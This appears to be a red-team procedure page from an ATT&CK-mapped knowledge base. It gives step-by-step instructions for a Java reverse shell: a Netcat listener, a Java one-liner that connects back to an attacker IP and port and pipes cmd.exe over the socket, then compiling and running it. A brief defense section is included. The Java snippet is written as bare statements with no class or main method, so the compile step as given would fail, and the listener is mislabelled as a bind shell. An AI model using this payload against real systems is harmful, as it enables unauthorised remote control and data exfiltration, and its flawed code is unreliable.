---
id: 75a4e7c0-3224-4c80-a2c8-81bc2d3ea191
name: Establish-Java-Reverse-Shell
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:24.553567+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques: []
tags:
  - '[[tags/Java]]'
  - '[[tags/Reverse-Shell]]'
  - '[[tags/Post-Exploitation]]'
commands:
  - '[[commands/nc-tcp-listener]]'
  - '[[commands/create-java-shell-file]]'
  - '[[commands/javac-compile]]'
  - '[[commands/java-execute]]'
platforms:
  - Windows
  - Linux
  - macOS
tools: []
validated: true
---

# Establish-Java-Reverse-Shell

## Summary

This procedure demonstrates how to establish a reverse shell connection from a target machine to an attacker-controlled listener using a Java code snippet. It is particularly useful in environments where Java is installed but other scripting languages like Python or PowerShell are restricted or absent, allowing attackers to gain interactive command execution and data exfiltration capabilities.

## Description

A Java reverse shell involves executing a small Java program on the target system that initiates a TCP connection back to the attacker's listener. Once connected, the shell pipes input/output streams between the target process (e.g., cmd.exe on Windows) and the attacker's machine, enabling remote command execution. This technique bypasses some endpoint detection by leveraging the native Java runtime. It requires network connectivity from target to attacker and is commonly used post-initial access for persistence or lateral movement. Success results in an interactive shell session, from which further commands can be issued to explore the system or exfiltrate data.

## Requirements

1. Java Runtime Environment (JRE) or Java Development Kit (JDK) version 8 or higher installed on the target machine.
2. Network access from the target to the attacker's IP and port (outbound TCP connection allowed).
3. Attacker machine with a listener tool like Netcat for receiving the connection.
4. Write access on the target to create and execute the Java file (e.g., via initial foothold like a webshell).

## Defense

- Disable or restrict Java execution on endpoints through application whitelisting (e.g., AppLocker on Windows) or disabling Java in browsers.
- Monitor for unusual outbound TCP connections to non-standard ports and anomalous Java process spawning (e.g., via EDR tools like Sysmon or Windows Defender).
- Implement network segmentation and firewall rules to block unexpected reverse connections.
- Enable Java logging and auditing to detect suspicious code execution.

## Objectives

1. Establish a bidirectional command and control channel from the target to the attacker.
2. Gain interactive shell access for command execution on the target system.
3. Enable data exfiltration or further post-exploitation activities through the shell.

## Instructions

### Step 1: Set Up Listener on Attacker Machine

**Context**: Before executing the reverse shell on the target, start a TCP listener on your controlled machine to catch the incoming connection. This uses Netcat to create a simple bind shell listener.

**Command** ([[commands/nc-tcp-listener]]):
```bash
nc -lvnp 4444
```

> This command binds to port 4444 and listens for incoming connections. Expected output is a confirmation message like "Listening on [0.0.0.0] (family 0, port 4444)". Keep this running while preparing the target side.

### Step 2: Create Java Shell File on Target

**Context**: On the target machine (via initial access method like a limited shell or file upload), create a Java source file containing the reverse shell code. This step prepares the payload for compilation and execution.

**Command** ([[commands/create-java-shell-file]]):
```bash
echo 'String host="$_ATTACKER_IP"; int port=$_ATTACKER_PORT; String cmd="$_SHELL_CMD"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();' > ReverseShell.java
```

> Replace placeholders with actual values (e.g., $_ATTACKER_IP=192.168.1.100, $_ATTACKER_PORT=4444, $_SHELL_CMD=cmd.exe for Windows). Expected output: No output if successful; verify with `ls ReverseShell.java` or equivalent to confirm file creation.

### Step 3: Compile the Java File

**Context**: Compile the Java source code into a bytecode class file using the javac compiler. This step is necessary if running on a system without a Java REPL; it produces an executable .class file.

**Command** ([[commands/javac-compile]]):
```bash
javac ReverseShell.java
```

> Ensure JDK is in PATH. Expected output: No output on success; generates ReverseShell.class. If errors occur (e.g., syntax issues), check Java version compatibility.

### Step 4: Execute the Compiled Java Code

**Context**: Run the compiled Java class to initiate the reverse connection. This spawns the shell process and connects back to the listener, establishing the interactive session.

**Command** ([[commands/java-execute]]):
```bash
java ReverseShell
```

> Expected output on attacker side: Incoming connection and shell prompt (e.g., "Microsoft Windows [Version 10.0.19041.1320]" for Windows). On target, no console output if successful; monitor listener for connection.

**Code Reference** ([[codes/Java-One-Liner-Reverse-Shell]]): The core payload code is embedded in the file created in Step 2. This one-liner handles the socket connection, process I/O piping, and shell execution.
